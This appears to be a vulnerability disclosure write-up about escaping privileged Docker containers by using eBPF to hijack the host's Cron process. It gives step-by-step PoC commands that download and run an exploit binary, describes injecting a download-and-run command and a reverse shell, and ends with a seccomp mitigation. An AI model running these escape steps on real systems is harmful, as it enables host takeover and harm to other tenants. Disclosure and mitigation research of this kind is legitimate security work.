# Universal Container Escape with eBPF

## Attack Requirements
Enabling eBPF inside a contianer. This needs to run docker with one of the following flag:  
- `--cap-add SYS_ADMIN`
- `--privileged`
- `-v /var/run/docker.sock:/var/run/docker.sock`  

If the container is running with any of the three config, users can run eBPF in this container and can use eBPF to escape this container.  
e.g., `docker run -it --name container_test --privileged ubuntu:20.04 bash`

## Attack Detail
Inside a Container, the attackers can use eBPF tracing program (e.g., KProbe) to hijack the processes out of the containers via writing their memory and opened files with the bpf_probe_write_user helper. By injecting malicious commands  (e.g., spawn a reverse shell to the attacker's host) to a privilege process (e.g., bash, Cron) in Host VM, the attackers can execute commands in the host to get control of the host VM and escape the container. 


## Exploit Any Container on Ubuntu 20.04
Here is a PoC for hijacking the Cron process in Ubuntu 20.04. You can run a container with CAP_SYS_ADMIN in Ubuntu 20.04, and execute the PoC program inside the container to hijack the host's Cron process and escape the container.  

#### Get the PoC
PoC Links: [Link1](https://cloud.tsinghua.edu.cn/f/063dd19446d24119b860/?dl=1)  or [Link2](https://drive.google.com/file/d/1glJCZVZuHCT9Y_V4PvQ9s_KXLf2AVBHX/view?usp=sharing)  

The PoC files contains several simple files,
``` bash
\evil_test
├── Dockerfile
├── README.txt
├── Vagrantfile
├── build.sh
├── exploit
└── run.sh
```

#### Run the PoC
Step-1: Create a VM with Ubuntu 20.04.
``` bash
$ tee -a Vagrantfile <<EOF
Vagrant.configure("2") do |config|
  config.vm.box = "generic/ubuntu2004"
end
EOF

$ vagrant init
$ vagrant up
$ vagrant ssh
```

Step-2: Launch the container and perform attack.
``` bash
# in the vagrant VM
$ wget https://cloud.tsinghua.edu.cn/f/063dd19446d24119b860/?dl=1 -O evil_test.zip
$ unzip evil_test.zip
$ cd evial_test
$ bash build.sh
Tick: 1
Tick: 2
...
```

Note that the `build.sh` will build and run the following Dockfile. 
``` bash
FROM ubuntu:20.04        
ARG DEBIAN_FRONTEND=noninteractive        
RUN apt update -y
RUN apt install -y wget
COPY ./exploit /
COPY ./run.sh /
CMD ["/bin/bash","/run.sh"]
```


Step-3: Check if the eBPF exploit program can success to escape the container.   

The eBPF `exploit` program will hijack the Cron of the host from the container. It will inject a command to the Cron to download and run a bash file, e.g., the `attack.sh` which create a directory and file at `/root`. If it success to escape the container, you will find a file with content `pwn` created in the path `/root/evil_escape/escape `.

``` bash
# in the vagrant VM
$ ls /root/evil_escape/escape
/root/evil_escape/escape  xxx

$ cat /root/evil_escape/escape 
pwn
```

Note that, the attackers actually can execute any commands in the `attack.sh` more than write files to `\root`.


## Exploit the CloudLab
CloudLab is a Docker based desktop environment. It has thousands of users and some of them deploy it online as public/private programming services. Users can run code in their online shell. Accordingly, attackers can escape the container via eBPF and harm other users' container instances.    

Here's the steps to run the exploit file in the container's shell of CloudLab.
``` bash
// inside the container
$ tools/docker/run
# wget https://cloud.tsinghua.edu.cn/f/886e8962ccb4472d8eb7/?dl=1 -O ebpf_exploit
# chmod +x ebpf_exploit
#./ebpf_exploit
Tick: 1
Tick: 2
...
```
Then, the container is escaped and can spwan a reserve shell to the attacker's server.

Note that this issue has been fixed at Jun 30 2022 after we disclose it to the TinyLab. 

### Mitigate
To run container with cap SYS_ADMIN, eBPF should be disabled. 
For example, we can set a seccomp rule for the Docker to deny the sys_bpf. You can write a Seccomp profile just like this,    
https://github.com/tinyclub/cloud-lab/blob/d19ff92713685a7fb84b423dea6a184b25c378c9/configs/common/seccomp-profiles-default.json


Then, you can use the `--security-opt seccomp=profile.json` flag to launch the Docker image with seccomp rules.

``` bash
docker run -it --name container_test --security-opt seccomp=profile.json ubuntu:20.04 bash
```